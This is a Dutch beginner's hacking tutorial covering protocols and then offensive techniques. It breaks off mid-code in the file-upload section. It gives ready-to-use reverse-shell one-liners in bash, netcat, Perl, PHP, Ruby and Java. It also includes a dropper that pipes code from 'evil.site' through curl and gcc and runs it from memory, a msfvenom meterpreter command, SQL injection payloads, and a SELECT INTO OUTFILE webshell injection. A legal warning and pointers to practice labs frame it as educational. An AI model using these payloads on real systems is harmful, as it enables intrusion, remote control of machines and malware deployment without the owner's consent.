# Voorwoord
In het kader van [https://www.laatjeniethackmaken.nl](https://www.laatjeniethackmaken.nl "laatjeniethackmaken.nl") heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). 

Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.

Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction. Spot je een foutje, of heb je een verzoekje voor inhoud, maak dan een [issue](https://github.com/gatochhacken/gatochhacken.github.io/issues) aan op [github](https://www.github.com).

Als je aan deze pagina wilt bijdragen, bekijk dan even het dankwoord onderaan.

**LET OP** alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel [138ab](http://wetten.overheid.nl/jci1.3:c:BWBR0001854&boek=Tweede&titeldeel=V&artikel=138ab) wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van [https://www.certifiedsecure.com](https://www.certifiedsecure.com "Certified Secure")

# Inhoudsopgave #

# Bestandstypen #

## Portable Executable ##
Portable Executables zijn de executables van Windows. Hierbij kan je voornamelijk denken aan bestanden met de extensie EXE, DLL en SYS. In het PE formaat is alle informatie die bewaard is om een executable in het geheugen te laden en op een juiste manier uit te voeren. Een portable executable bestaat uit verschillende onderdelen, waaronder de Signature ([magic number](https://en.wikipedia.org/wiki/Magic_number_(programming))) (MZ). Om een goed begrip te krijgen van de latere teksten over het backdooren van executables is het handig om eerst de inhoud en de werking van het PE formaat te kennen. Hiervoor raad ik je aan, op zijn minst, het volgende te [lezen](https://en.wikipedia.org/wiki/Portable_Executable#Technical_details).


# Protocollen
Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.

## HTTP

Het [HTTP protocol](https://tools.ietf.org/html/rfc7230) is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:

    GET /index.php HTTP/1.1
    User-Agent: Firefox
    Host: www.voorbeeld.nl
    Accept-Language: en
     
    
In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met het versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
Als reactie hierop stuurt de server het volgende antwoord:

    HTTP/1.1 200 OK
    Date: Thu, 3 May 2018 18:43:53 GMT
    Server: Apache
    Last-Modified: Wed, 2 May 2018 01:44:23 GMT
    Content-Length: 73
    Content-Type: text/plain
    
    Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)

Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:

**POST**, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.

**HEAD**, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.

**TRACE**, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.

## [FTP](https://tools.ietf.org/html/rfc959)

## [ICMP](https://tools.ietf.org/html/rfc792) ##
Het Internet Control Message Protocol (ICMP) is een protocol wat men gebruikt om netwerkfunctionaliteiten te testen. I Denk hierbij aan de bereikbaarheid van een server als je PING'ed en een reactie van een router dat het doelnetwerk onbereikbaar is.

Een ICMP pakket bestaat uit 16 bytes, waarbij de eerste byte de type is, de tweede byte de code. De derde en de vierde byte is de checksum van het pakket en in de laatste 4+ bytes staat een restantdeel. Dit is afhankelijk van het type en de code van het pakket.

Binnen ICMP is de type 0, code 0 packet de packet die je het vaakst gebruikt zal hebben. Deze packet verzend je namelijk als je op je commandline het ping commando gebruikt. Dit packet heet officieel de "Echo reply". Deze packet kan je potentieel gebruiken om data te exfiltreren. Alles na de officiele headers is namelijk vrij in te vullen en kan (al dan niet) gelijk geretourneerd worden.

Type 11 code 0 of 1 kan je gebruiken om het aantal hops tussen jou en een ander te bereiken. Denk hierbij aan tracert. Je kan de tracert (in verband met de TCP Time-to-live) ook gebruiken om te ontdekken of er inline firewalls aanwezig zijn.

## OSI-model ##
Alhoewel het OSI(Open Systems Interconnection)-model geen protocol is is het wel iets wat handig is om in je achterhoofd te houden als je iets wilt gaan doen met netwerk hacking. Het OSI-model bestaat uit 7 lagen. Hoe hoger de laag, des te dichter je bij de gebruiker aangekomen bent. Hieronder spits ik het toe op een TCP/IP stack, wil je iets anders hierover lezen dan is google een goede start. De lagen zijn als volgt:

**Laag 1: Physical**

De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.
Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.

**Laag 2: Datalink**

De datalink laag bepaald de manier hoe er gecommuniceerd word en met wie. In deze laag zul je ook vaak foutcorrectie vinden. Voorbeelden van protocollen op deze laag zijn ethernet, CHAP en ARP. Dit kan je vergelijken met een adres die op de enveloppe geschreven wordt of of afgelezen wordt. 
	
**Laag 3: (inter)Network**

In deze laag vind je de IPv4 protocollen en de IPv6 protocollen zowel als IPSec en NAT. In deze laag wordt het mogelijk gemaakt om verschillende netwerken aan elkaar te knopen en routing toe te passen. Een bijkomend voordeel is dat bij het IP protocol hier IP adressen ontstaan die voor mensen normaal te lezen zijn. Dit kan je vergelijken met het opschrijven of aflezen van de postcode.

**Laag 4: Transport**

In de transport laag wordt end-to-end communicatie mogelijk gemaakt, hier wordt in feite de envelop gemaakt waar de boodschap in gaat. Bij sommige protocollen worden hier ook betrouwbaarheidsmaatregelen genomen, zoals bijvoorbeeld bij TCP. Bij TCP schrijf je ook een antwoordbevestiging op de envelop.

**Laag 5: Session**

Deze laag beheert de sessies die tussen twee communicerende partijen bestaan, het houd de verbinding open of sluit hem af als hij niet meer noodzakelijk is. Hierbij kan je denken aan SSH, SMB of RDP.

**Laag 6: Presentation**

De presentatie laag is de plaats waar de informatie een encoding,compressie of encryptie krijgt (of het omgekeerde natuurlijk). Deze laag is niet altijd eenvoudig te duiden, HTTP kan in sommige visies namelijk zowel onder de presentatie als de applicatie laag vallen.

**Laag 7: Application**

De applicatielaag is de hoogste laag van het OSI model en deze laag ligt erg dicht bij een eindgebruiker en hij zal deze dan meestal ook het vaakst kennen. Binnen deze laag vallen protocollen als DNS, WEBDav, HTTP en FTP. Dit zijn protocollen waarmee computers direct met elkaar kunnen communiceren over de (met de lagere lagen) opgezette telecommunicatie- en computernetwerken.

In laag 1 wordt de informatie uitgedrukt in bits, in laag 2 spreken we over frames. In laag 3 over packets en laag 4 over segments. Alles boven laag 4 is data.

Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is *All people should try new dairy products*	

#Shells

##Reverse shell
Alhoewel een volledig interactieve shell soms niet nodig is om je doel te bereiken, is het wel een van de krachtigste toegangen die je als hacker kan krijgen. Een reverse shell is wanneer een computer naar jou terug verbind en vervolgens zijn shell of command line aan jou ter beschikking stelt.

Er zijn verschillende manieren om shells te bemachtigen, waaronder standaard met programmeertalen danwel de methodes met kant en klare agents.
 
Hieronder zal ik er een aantal plaatsen:
### Bash

    exec /bin/bash 0&0 2>&0 
    bash -i >& /dev/tcp/< ip >/< port > 0>&1

Mocht dit problemen geven probeer dan

    /bin/bash -i > /dev/tcp/< ip >/< port > 0<&1 2>&1

### Java
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/< ip >/< port >;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

### Netcat
Op oudere systemen zul je nog nc applicaties vinden met de [schakeloptie -e](https://explainshell.com/explain?cmd=nc+-e). Deze schakeloptie heeft als voordeel dat je een executable op kan geven welke, na het tot stand komen van een connectie, uitgevoerd zal moeten worden. Het is dan kinderlijk eenvoudig om een reverse shell op te zetten.

    nc -e /bin/sh < ip > < port >

Als je niet de beschikking hebt over een ouder systeem en er een modernere netcat beschikbaar is waarin de (onveilige) schakeloptie -e verwijderd is, dan kan je gebruik maken van een zogenaamde backpipe.

    mknod bp p; nc < ip > < port > 0<bp | /bin/bash 1>bp

Je maakt hier een block special file aan met [mknod](http://man7.org/linux/man-pages/man1/mknod.1.html), deze heeft als naam bp en als type p. Het type p betekend dat het een FIFO (first in first out) bestand is, waarbij we de standard output van de commando's van netcat naar /bin/bash terug naar netcat forwarden.

### Telnet ###

Heel af en toe kom je wel eens ene omgeving tegen waarin je geheel geen toegang hebt tot de netcat executable. Nu kun je deze introduceren (en zo extra sporen maken) of je kan gebruik maken van telnet. 

    mknod bp p; telnet < ip > < port > 0<bp | /bin/bash 1>bp

### Perl

    perl -e 'use Socket;$i="< ip >";$p=< port >;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### [PHP](https://www.php.net)

    php -r '$sock=fsockopen("< ip >",< port >);exec("/bin/sh -i <&3 >&3 2>&3");'

### Ruby ###

    ruby -rsocket -e'f=TCPSocket.open("< ip >",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## Droppers ##
Soms heb je een specifiek stukje malware wat je op een systeem wilt introduceren. Hiervoor is het niet altijd perse noodzakelijk om een uitgebreide dropper te schrijven. Het kan soms ook al voldoende zijn om met zo min mogelijk sporen datgene wat je wilt introduceren te introduceren. Denk hierbij bijvoorbeeld aan een zelf geschreven backdoor.

Een leuk voorbeeld hiervan is de volgende:

    curl -s https://evil.site/code.c | gcc -o /dev/shm/.a -x c -; /dev/shm/.a; rm /dev/shm/.a

Je download via curl de source code die je nodig hebt, compiled deze met GCC en laat de uitvoer hiervan naar [/dev/shm](https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) toeschrijven. Aangezien /dev/shm memory mapped is, bestaat deze map eigenlijk alleen in het werkgeheugen van de computer. Na ene reboot is alle inhoud hiervan verdwenen. Mocht iemand een image maken van het filesystem dan zal hij de malware dus ook niet tegenkomen.

Een uitgebreidere dropper zal overigens rekening houden met de omgeving waarin hij werkt. Hij zal controleren of er sprake is van een malware analyse platform, hij in een VM draait of dat er debugging tools actief zijn. Mocht dit allemaal het geval zijn dan zal hij zijn acties niet voortzetten.

Mocht je een handmatige plaatsing als methode willen gebruiken kan je gebruik maken van een code als:

    echo -e "< shellcode >" > /dev/shm/.p; chmod +x /dev/shm/.p;/dev/shm/.p & rm /dev/shm/.p

## MSFVenom ##
Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen. Een handige manier om een payload te genereren om in buffer overflows te gebruiken is:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=< ip > LPORT=< port > -f hex

De "-f hex" zorgt er in dit geval voor dat de payload direct hexadecimaal te kopieren geplakt word. Deze variant kan je ook makkelijker gebruiken voor het direct in een executable patchen van een shell.

### Linux ###

### Mac ###

### Windows ###

### Android ###

# Web attacks #

## Oefenomgeving ##

Zoals eerder genoemd is certified secure een mooie omgeving om web attacks te oefenen. Je kan hiervoor ook de Damn Vulnerable Web Application ([DVWA](http://www.dvwa.co.uk/)) gebruiken. De DVWA geeft een kwetsbare website waar je een heleboel van de hieronder genoemde technieken kan beoefenen. Je kan de DVWA in bijvoorbeeld [vmware player](https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html) draaien.

De standaard gebruikersnaam en wachtwoord zijn admin en password. Je kan deze gegevens ook proberen te bruteforcen.

**Waarschuwing** Draai DVWA **nooit** op een echte server. Het is echt zo kwetsbaar en je webserver zal snel overgenomen worden.

## Enumeratie ##

Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.

### Zoekmachinefuncties ###

Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd [robots.txt](http://www.robotstxt.org/) bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.

Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de [sitemap](https://en.wikipedia.org/wiki/Site_map). In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.

### Webpagina's ###

Als je niet weet welke mappen of bestanden er allemaal bestaan kan je bij bekende softwarepakketten de installatiebestanden downloaden en deze installeren. Op deze manier kan je een beeld krijgen welke pagina’s er allemaal in een installatie horen te zitten en kan je er achter komen of er iets als een changelog (publiek) beschikbaar is waarmee je de versie van een applicatie kan achterhalen.

### Dynamische pagina's ###

Tegenwoordig bevatten de meeste websites een content managment systeem. Deze content managment systemen maken het makkelijker om websites aan te maken en te beheren. Een beheerder hoeft geen HTML of CSS code meer te typen en kan eenvoudiger nieuwe pagina’s aan maken. Ook kan je vaak de inhoud van je website in eenzelfde omgeving typen als je van moderne tekstverwerkers gewend bent.
Als je een website tegen komt waarbij dit het geval is, en je vervolgens ziet dat userprofielen op te vragen zijn met een getal, dan kan je potentieel alle gebruikersnamen verzamelen. 

**Voorbeeld wordpress:**
Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs te vergaren. Deze inlognamen worden gebruikt om op het wp-admin panel in te loggen. 

http://<wordpress>/?author=<id>

Als je het id nummer op 1 zet krijg je de gebruikersnaam van de eerste aangemaakte Wordpress gebruiker. Dit zal vaak de administrator zijn.

### Login formulieren ###
Ook login formulieren kunnen een schat aan informatie prijs geven, zoals of een gebruiker bestaat en of je het juiste wachtwoord hebt. In het laatste geval zal je logischerwijs inloggen. Alhoewel het best practice is om aan te geven dat de gebruikersnaan en/of wachtwoord foutief ingevuld zijn geven sommige websites ook nog verschillende gegevens weer.

![](http://gatochhacken.nl/images/web_user_enumerate_gebruiker.png)

Je kan hier bijvoorbeeld zien dat je de gebruikersnaam niet goed hebt omdat de gebruiker niet bestaat.

![](http://gatochhacken.nl/images/web_user_enumerate_wachtwoord.png)

Je kan hier bijvoorbeeld zien dat je de gebruikersnaam goed hebt, immers er is een dit wachtwoord is incorrect melding verschenen.

![](http://gatochhacken.nl/images/web_user_enumerate_geenconclussie.png)

Aan dit veld kun je geen conclussies meer verbinden.

### Source code analyse ###
Alhoewel niemand van je verwacht dat je elke programmeertaal kunt schrijven die er bestaat, is het wel van waarde dat je in een taal leert programmeren. Als je in bijvoorbeeld Python kan programmeren zul je heel veel logica uit andere talen ook snappen. Je zal dan bijvoorbeeld ook de fouten van anderen in de logica snappen. 

Er zijn meer mensen die websites beheren en bezitten dan die ze zelf kunnen schrijven, je moet dus niet raar opkijken als je vaker dezelfde software voorbij ziet komen. Als je een challenge of een website wilt hacken is het aan te raden om op zoek te gaan naar de source code van die website. Nu verwacht ik niet dat je in [wordpress](https://wordpress.com/) een zwakheid gaat treffen, maar in een an haar vele (verlaten) plugins kan dit zomaar het geval zijn.

Source code van applicaties kan je vaak op websites als [github](http://github.com/) of [sourceforge](https://sourceforge.net) (etc.) vinden. Ga in deze source op zoek naar foutjes, kijk naar installatie bestanden en de hiervoor vereiste rechten (en of deze ook weer beperkter ingesteld worden). Vind je eigen zwakheid en meld hem na gebruik om het internet weer een veiligere plek te maken.

### Javascript ###
De javascript onderdelen van websites verklappen vaak meer dan de eigenaar van de website wil. Ga je deze javascript code in de source opzoeken vind je vaak één hele lange regel met code. Om deze alsnog leesbaar te maken kun je gebruik maken van een JS Beautifier. Een JS Beautifier zorgt dat de code weer overzichtelijk neergezet is en je het kan analyseren. **Let op: ** gebruik voor dit soort zaken nooit online tools, je weet maar nooit wat ze op slaan!

## Server-side controle functionaliteiten ##
### Object injecttion ###
In veel talen is het mogelijk om objecten te serialiseren. Dit maakt het mogelijk om de status van je object te bewaren en op een later moment weer met dezelfde status verder te gaan. Het voordeel hiervan is dat je, bijvoorbeeld, de status van een user sessie op kan slaan en deze later weer in kan lezen om je gebruiker een meer soepele ervaring aan te bieden. In een taal als PHP doe je dit met de [serialize](http://www.php.net/serialize) en de [unserialize](http://www.php.net/unserialize) functies. Dit soort functies (en de bijbehorende problemen) bestaan overigens in meer talen waaronder python en java.

Als voorbeeld wil ik de volgende PHP code opgeven:

	<?PHP
	class userClass
	{
		public $username = '';
		public $id = '';
		
		function __contruct($id)
		{
			$this->username = file_get_contents('usercontent/'.$id);
			$this->id = $id;
		}

		function __sleep()
		{
			file_put_contents('usercontent/'.$this->id,$this->username);
			return array('id');
		}

		function __wakeup()
		{
			$this->username = file_get_contents('usercontent/'.$this->id);
		}
	}

	if (isset($_COOKIE['userId']))
	{
		unserialize($_cookie['userId']);
		echo "Hallo ".$userClass->username;
	}
	?>

In dit voorbeeld bestaat er een class "userClass". Deze class heeft een wakeup en sleep [magic method](http://php.net/manual/en/language.oop5.magic.php). Deze magic method's zijn functies die in bepaalde situaties aangeroepen worden als dit verwacht mag worden. In het geval van de wakeup is dit als een object wil deserializen, en bij sleep als deze geserializeerd gaat worden. Deze magic methods worden dan altijd, automatisch, aangeroepen.

Aangezien de username in dit voorbeeld in een bestand weggeschreven word als het sleep commando aangeroepen is, kun je aannemen dat dit user input is die op de webserver weggeschreven is. Hier kan je op zich niet heel veel aan misbruiken. Bij het wake up commando daarentegen zal er een bestand uitgelezen worden met de naam gelijk aan het user id in de cookie.

Als er een legale user is opgegeven, in onderstaande geval een user met userid 1 en de gebruikersnaam "meh", dan zal er een object in de cookie staan die er als volgt uit ziet:


    O:9:"userClass":1:{s:2:"id";i:1;}

Als we nu de bovenstaande class zelf in een PHP script zeztten, en hier zelf een andere ID in invoeren, zoals bijvoorbeeld 


    ../../../../../../etc/passwd

en deze inhoud in de cookie zetten, dan krijgen we een cookie als deze:

    O:9:"userClass":1:{s:2:"id";s:28:"../../../../../../etc/passwd";}

Bij het deserialiseren van deze cookie zal er geen bestand ingelezen worden met gebruikersgegevens, maar zal de inhoud van de /etc/passwd file in de variabele username gezet worden. Bij het inladen van de website heb je op deze manier information disclosure verkregen. De mogelijkheden die je hebt met object injection zijn altijd afhankelijk van de logica die reeds in de class aanwezig is.

### [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery) ###
Bij SSRF maak je gebruik van een functionaliteit die de server normaal gesproken gebruikt om een actie uit te laten voeren waar jij normaal gesproken geen toegang toe hebt. Denk hierbij aan dual-homed servers of servers die door firewall rules een bredere toegang hebben tot het achterliggende netwerk. Meestal zal het hier dan gaan om dynamische webapplicaties. Dit kan soms ontstaan omdat de server gebruik maakt van command line applicaties zoals curl, of door middel van functies waarmee path's geopend kunnen worden. 

Als voorbeeld kan je naar het volgende script kijken:
    
	<?PHP
    	if (isset($_GET['file']))
    	{
    		$file = $_GET['file'];
    	}
    
    	$content = fopen($file,'rb');
    	passthru($content);
    ?>

In dit voorbeeld is het eigenlijk de bedoeling dat de gebruiker met de file parameter een lokaal bestand kan uitlezen om die weer te geven. Op sommige servers kan je hiermee URL's uitlezen. Dit kan je doen omdat de [allow_url_fopen](http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen) variabele op true staat. Als je deze methodiek gebruikt om http://intranet/geheim_document.txt te openen, dan zal je deze keurig geserveerd krijgen terwijl jij hier officieel niet bij kan.  

Mocht je wachtwoorden kennen van een gebruiker op het systeem en je wilt een tunnel opbouwen dan kan je potentieel in het bovenstaande voorbeeld gebruik maken van de [ssh2](http://php.net/manual/en/wrappers.ssh2.php) wrapper (uit by default) van PHP. 

Als de request nu met [cURL](https://en.wikipedia.org/wiki/CURL) uitgevoerd was, dan was het mogelijk om van de dict:// wrapper gebruik te maken. Met deze wrapper kan je van bijvoorbeeld een op localhost draaiende memchached de [stats](https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/ha-memcached-stats.html) pagina opvragen.

Klik [hier](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#) voor een zeer uitgebreide cheatsheat.

### SQL ###
Voor sommige websites is het niet erg lastig om een SQL injectie uit te voeren. Er word een login formulier ingevuld en de credentials worden rechtstreeks naar een database gestuurd. Een voorbeeld hiervan in PHP kan bijvoorbeeld zo eruit zien:

    <?PHP
    	if (isset($_POST['submit']))
		{
			$result = mysqli_query($db,"SELECT id FROM users WHERE username='".$_POST['username']."' AND password="'.sha256($_POST['password']).'" lIMIT 1");
			if (mysqli_num_rows($result) == 1)
			{
				echo "U bent ingelogd";
			}else{
				echo "Uw gebruikersnaam of wachtwoord zijn fout";
			}
		}
    ?> 

Als je in het inlogformulier in een gebruikersnaam nu geldige SQL code schrijft, dan zal deze rechtstreeks in de query ingevoerd worden. Eerst moeten wij uit de quote breken, dus we plaatsen een enkele quote. Dan willen wij graag dat er een geldig resultaat word opgehaald, dus plaatsen wij er een OR 1 achter. Om te voorkomen dat de rest van de query ook nog uitgevoerd zal worden en wij dus een wachtwoord moeten opgeven, gaan wij de rest van de query uitcommenten. Dit doen wij met # -- .

Onze complete injectie ziet er dan als volgt uit:

`' OR 1 # -- ` 

Als je deze injectie invoert in de SQL injectie pagina van DVWA, dan zal je zien dat hij elke gebruiker terug geeft. In het bovenstaande voorbeeld maar 1, de eerste die hij tegen komt.  Op deze manier kan je elke mogelijke (correcte) query invoegen in een onveilig statement.

In sommige andere gevallen kan je meer informatie uit een database halen dan dat de websitemaker eigenlijk wilde. Er bestaan websites waarbij er dynamisch pagina's worden opgehaald om deze vervolgens aan de eindgebruiker weer te geven. Een voorbeeld van zo een pagina is als volgt: 

    <?PHP
		$pagina = 0;
		if (isset($_GET['pagina']))
		{
			$pagina = $_GET['pagina'];
		}
		
		$rPagina = mysqli_query($db, "SELECT titel, inhoud FROM paginas WHERE id=".$_GET['pagina']." LIMIT 1");
		if (mysqli_num_rows($rPagina) > 0)
		{
			$aPagina = mysqli_fetch_assoc($rPagina);

			echo "
				<h1>".$aPagina['titel']."</h1>
				".$aPagina['inhoud'];
		}
	?>

In deze pagina kan je met een sql injectie meer informatie opvragen. Voor deze query kun je gebruik maken van een **UNION SELECT injectie**.

allereerst gaan wij kijken of deze pagina überhaupt kwetsbaar is voor een SQL injectie. Wij gebruiken hiervoor een simpel testje, namelijk:


    1 OR 1=1

Als het goed is zie je weer gewoon de inhoud van de eerste pagina. Als de query niet kwetsbaar was geweest bleef je pagina leeg of zag je een foutmelding.

Bij een union select injectie is het van belang dat er net zo veel kolommen opgevraagd worden uit de database als oorspronkelijk al het geval was in de query. Ook moet je zorgen dat er uit de oorspronkelijke query geen enkel resultaat meer terug gegeven wordt.

De makkelijkste manier om te zorgen dat je geen resultaat terug krijgt bij een query met een numerieke ID als beperkende factor is die met het ID -1 selecteren. Als je als paginanummer -1 invoert zul je zien dat de pagina leeg blijft.

Alhoewel je nu natuurlijk al weet hoeveel kolommen je moet selecteren gaan wij toch proberen te achterhalen hoeveel het er moeten zijn. Na de -1 typen we nu UNION SELECT 1. Je krijgt dan de volgende injectie:

    -1 UNION SELECT 1

Als het goed is zie je of een foutmelding, of je pagina blijft leeg.

Als we dan de volgende selectie opgeven:

    -1 UNION SELECT 1,2

dan zie je als het goed is in de titel het getal 1, en in de inhoud het getal 2. 

Als je nu wilt weten welke tabellen er allemaal op de database server bestaan dan kun je kijken in de MySQL systeem database information_schema en dan in de tabel table. Hierin staan de kolomnamen table_schema en table_name. Probeer de volgende query maar eens in phpmyadmin:

    SELECT table_schema, table_name FROM information_schema.table

Doormidden van group_concat en concat kan je vervolgens deze velden in 1 kolom stoppen.

Als we terug gaan naar onze union select injectie kunnen wij de volgende query ervan maken:

`-1 UNION SELECT 1, GROUP_CONCAT(concat('table_schema'.'table_name'), '-') FROM information_schema.table # --` 

Zie in de inhoud nu alle tabellen verschijnen.

### Van SQL injectie naar Webshell ###

Als wij het bovenstaande codevoorbeeld weer pakken:

    <?PHP
		$pagina = 0;
		if (isset($_GET['pagina']))
		{
			$pagina = $_GET['pagina'];
		}
		
		$rPagina = mysqli_query($db, "SELECT titel, inhoud FROM paginas WHERE id=".$_GET['pagina']." LIMIT 1");
		if (mysqli_num_rows($rPagina) > 0)
		{
			$aPagina = mysqli_fetch_assoc($rPagina);

			echo "
				<h1>".$aPagina['titel']."</h1>
				".$aPagina['inhoud'];
		}
	?>

Zoals wij eerder gezien hebben kan je dan gegevens opvragen, maar sommige SQL accounts hebben ook toegang tot de [SELECT ... INTO](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) syntax. Je webapplicatie moet wel schrijfrechten hebben op de plaats waar je een bestand wilt wegschrijven. Denk dan aan logische locaties zoals /tmp (heb je wel een LFI nodig) of in een directory van de webserver. Ook mappen waar de website sowieso file uploads opslaat zijn goede locaties.

Een voorbeeld van een injectie die je dan kan doen is als volgt:

`-1 UNION SELECT 1, '<?PHP $return = array(); exec($_GET['c'],$return); echo implode("\n",$return); ?>' INTO OUTFILE '/var/www/html/shell.php' # --`

Als je dan op de webserver de file shell.php opvraagt met als querystring c=ls dan zal je de directory listing zien van de /var/www/html map.  

## Client-side controle functionaliteiten ##

### Authenticatiefouten ###

### Sessie management ###
Veel webapplicaties maken gebruik van sessies om de gebruikerservaring te verbeteren. In dit soort sessies worden bijvoorbeeld de gebruikersgegevens over authenticatie en identificatie opgeslagen. Hiermee kan een website bepalen tegen welke gebruiker hij praat en of deze gebruiker al dan niet ingelogged is. 

De identifiers van deze sessies worden in een cookie opgeslagen. Deze gegevens moeten met elke pagina refresh meegezonden worden omdat een HTTP request in zichzelf stateless is.

In PHP heten deze session, standaard, cookies PHPSESSIONID en in Java JSESSIONID.

Als je door middel van, bijvoorbeeld, XSS de session id's kan stelen is het in sommige webapplicaties mogelijk om jezelf voor te doen als een andere gebruiker. Krijg je zo de cookies van een administrator te pakken, dan kan je de gehele website overnemen.

### NoSQL ###

### CSP Bypass ###

### XPath ###

### LDAP ###

### Verborgen formuliervelden ###
Sommige developers gaan er van uit dat verborgen velden in formulieren ook echt verborgen zijn voor een eindgebruiker, maar elke eindgebruiker kan natuurlijk de page source opvragen. Je kan een verborgen veld in een formulier zelf eenvoudig aanpasbaar maken met de inspector/debugging functionaliteiten van je browser of door zelf een nieuw formulier te maken.

Als de developer de denkfout gemaakt heeft dat een verborgen formulier nooit gezien zal worden door een eindgebruiker, is het niet ondenkbaar dat er ook geen filtering en beveiliging plaats vind op de invoer uit deze velden.

### File uploads ###

#### HTML verificatie ####
File uploads zijn een prachtige gelegenheid om je eigen (al dan niet uitvoerbare) code op een webserver te krijgen. Soms is er gebruik gemaakt van een perfecte implementatie waarbij je alleen afbeeldingen kan uploaden, in andere gevallen is er ergens een foutje gemaakt in de logica. De verificatie van bestanden die iemand wil uploaden kan client-side of server-side plaatsvinden. Een van de voorbeelden van client-side verificatie is de HTML accept attribute.

Bij een input tag met als type attribute file kan een developer ook een accept attribute opgeven. In deze accept attribute kan hij de [MIME types](https://en.wikipedia.org/wiki/Media_type#mime.types) of de file extensies opgeven. 

    <input type="file" accept=".png,.jpg,.jpeg,.gif" />

of 

    <input type="file" accept="image/jpeg" />

of 

    <input type="file" accept="image/*" />

Een kwaadwillende bezoeker kan dit formulier kopiëren en naar zijn eigen hand zetten door de accept attribute te verwijderen. Als er geen vorm van filetype verificatie plaats vind, dan upload je zonder enige problemen je bestand. Op deze manier kan je bijna elke client-side upload beveiliging omzeilen. Javascript is immers ook uit te schakelen, danwel met een eigen implementatie alsnog te misbruiken.

#### strpos ####
Als er wel gebruik is gemaakt van een server-side script om de file verificatie te doen, dan is strpos bijna de slechtste. Soms zie je dat een developer de volgende code gebruikt om te verifiëren of een filetype op de whitelist staat.
    
    <?PHP
    	$extensions = array('.gif','.jpg','.png','.jpeg');
    	$filename = $_FILES['upload']['name'];
    
    	$valid = 0;
    	foreach ($extensions AS $extension)
    	{
    		if (strpos($filename,$extension) !== false)
    		{
    			$valid = 1;
    		}
    	}
    
    	if ($valid !== 1)
    	{
